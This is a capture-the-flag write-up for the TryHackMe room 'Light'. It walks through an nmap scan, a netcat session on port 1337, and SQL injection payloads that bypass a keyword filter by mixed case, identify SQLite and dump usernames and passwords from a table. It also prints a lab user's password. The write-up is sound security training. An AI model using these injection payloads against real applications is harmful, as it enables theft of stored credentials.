---
title: "Light"
date: 2025-03-06
image: /assets/img/tryhackme/Light/Light_image.jpg
description: Writeup of the TryHackMe-CTF Light
categories: [Tryhackme, Easy]
tags: [linux, sqli]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Light</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Welcome to the Light database application!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/lightroom">https://tryhackme.com/room/lightroom</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Light.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.111.47                
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 11:12 EST
  Nmap scan report for 10.10.111.47
  Host is up (0.042s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  1337/tcp open  waste

  Nmap done: 1 IP address (1 host up) scanned in 20.81 seconds
```

Because of the challenge description, I skipped the nmap script scan and moved on to port 1337.

## Port 1337 Analysis

I started by using netcat to connect to the port 1337:
```bash
$ nc 10.10.111.47 1337        
  Welcome to the Light database!
  Please enter your username:
```

Since the description provided the username `smokey`, I entered it and received the following response:
```bash
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

I tested these credentials with `ssh`, but without success. The application takes user input, verifies it and returns the corrensponding password.  Keeping this in mind, I attempted some format string payloads, but they didn't work either. So, I continued with SQL injection payloads. While experimenting with common SQL keywords and syntax, I got the following results:
```bash
Please enter your username: select
Ahh there is a word in there I don't like :(
Please enter your username: Select
Username not found.
Please enter your username: UnIoN
Username not found.
Please enter your username: union
Ahh there is a word in there I don't like :(
Please enter your username: --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: '    
Error: unrecognized token: "''' LIMIT 30"
Please enter your username: 'test
Error: near "test": syntax error
```

Based on these results, I assumed that the SQL query handling the input might look something like this:
```sql
select password from users where username='our input' limit 30;
```

This suggests that there is a single column in the response, which I could potentially exploit using a `UNION` attack:
```bash
Please enter your username: 'Union Select true'
Password: 1
Please enter your username: 'Union Select TryHackMe'
Error: no such column: TryHackMe
```

Thats a success, I managed to break out of the SQL syntax! Now, I needed to gater more information about the database management system to refine my attack:
```bash
Please enter your username: 'Union Select @@version'   
Error: unrecognized token: "@"
Please enter your username: 'Union Select Version()'    
Error: no such function: Version
Please enter your username: 'Union Select sqlite_version()'
Password: 3.31.1
```

Great, it's an SQLite database! This information helped me to dig deeper and find the name of the user table:
```bash
Please enter your username: 'Union Select Sql From sqlite_master'
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

With this, I was able to extract more useful data from the `admintable`:
```bash
Please enter your username: 'Union Select group_concat(tbl_name) From sqlite_master'
Password: usertable,admintable
Please enter your username: 'Union Select username || ";" || password From admintable'
Password: [removed];[removed]
```

Since only one entry was returned, I checked if there where more:
```bash
Please enter your username: 'Union Select GROUP_CONCAT(username) from admintable'       
Password: [removed],flag
```

The flag entry is exectly what I was looking for:
```bash
Please enter your username: 'Union Select GROUP_CONCAT(password) from admintable'              
Password: [removed],THM{[removed]}
```

solved! :)
